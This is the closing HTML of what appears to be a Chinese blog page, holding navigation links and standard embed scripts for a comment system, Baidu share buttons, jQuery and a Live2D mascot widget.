    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
